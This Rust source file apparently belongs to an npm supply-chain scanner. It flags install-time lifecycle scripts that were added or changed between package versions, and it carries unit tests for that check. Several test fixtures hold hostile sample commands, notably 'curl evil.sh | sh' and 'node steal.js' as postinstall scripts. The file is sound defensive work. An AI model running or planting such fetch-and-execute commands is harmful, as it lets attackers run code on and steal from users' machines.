//! `new_lifecycle_script` — an install-time lifecycle script (preinstall /
//! install / postinstall) was added or changed versus the prior version.
//! Mirrors the most common npm supply-chain delivery vector.

use super::{finding, weights, VersionArtifact, LIFECYCLE_KEYS};
use crate::types::{Severity, Signal, SignalType};

pub fn detect(current: &VersionArtifact, prior: Option<&VersionArtifact>) -> Vec<Signal> {
    let mut out = Vec::new();

    for key in LIFECYCLE_KEYS {
        let Some(cmd) = current.manifest.scripts.get(*key) else {
            continue;
        };
        let prior_cmd = prior.and_then(|p| p.manifest.scripts.get(*key));

        // Added (no prior script) or changed (different command text).
        let is_new = match prior_cmd {
            None => true,
            Some(prev) => prev != cmd,
        };

        if is_new {
            out.push(finding(
                SignalType::NewLifecycleScript,
                Severity::High,
                weights::NEW_LIFECYCLE_SCRIPT,
                serde_json::json!({
                    "script": key,
                    "command": cmd,
                    "previously_present": prior_cmd.is_some(),
                }),
            ));
        }
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::signals::Manifest;
    use std::collections::BTreeMap;

    fn artifact_with_scripts(scripts: &[(&str, &str)]) -> VersionArtifact {
        let mut map = BTreeMap::new();
        for (k, v) in scripts {
            map.insert((*k).to_string(), (*v).to_string());
        }
        VersionArtifact {
            manifest: Manifest {
                scripts: map,
                ..Default::default()
            },
            ..Default::default()
        }
    }

    #[test]
    fn benign_no_install_scripts_no_finding() {
        let current = artifact_with_scripts(&[("build", "tsc"), ("test", "jest")]);
        let prior = artifact_with_scripts(&[("build", "tsc")]);
        assert!(detect(&current, Some(&prior)).is_empty());
    }

    #[test]
    fn benign_unchanged_postinstall_no_finding() {
        let current = artifact_with_scripts(&[("postinstall", "node-gyp rebuild")]);
        let prior = artifact_with_scripts(&[("postinstall", "node-gyp rebuild")]);
        assert!(detect(&current, Some(&prior)).is_empty());
    }

    #[test]
    fn malicious_added_postinstall_fires() {
        let current = artifact_with_scripts(&[("postinstall", "node steal.js")]);
        let prior = artifact_with_scripts(&[("build", "tsc")]);
        let signals = detect(&current, Some(&prior));
        assert_eq!(signals.len(), 1);
        assert_eq!(signals[0].signal_type, SignalType::NewLifecycleScript);
        assert_eq!(signals[0].weight, weights::NEW_LIFECYCLE_SCRIPT);
    }

    #[test]
    fn malicious_changed_postinstall_fires() {
        let current = artifact_with_scripts(&[("postinstall", "curl evil.sh | sh")]);
        let prior = artifact_with_scripts(&[("postinstall", "node-gyp rebuild")]);
        let signals = detect(&current, Some(&prior));
        assert_eq!(signals.len(), 1);
    }

    #[test]
    fn no_prior_with_install_script_fires() {
        // A brand-new package whose first version already has a postinstall.
        let current = artifact_with_scripts(&[("postinstall", "node setup.js")]);
        let signals = detect(&current, None);
        assert_eq!(signals.len(), 1);
    }
}
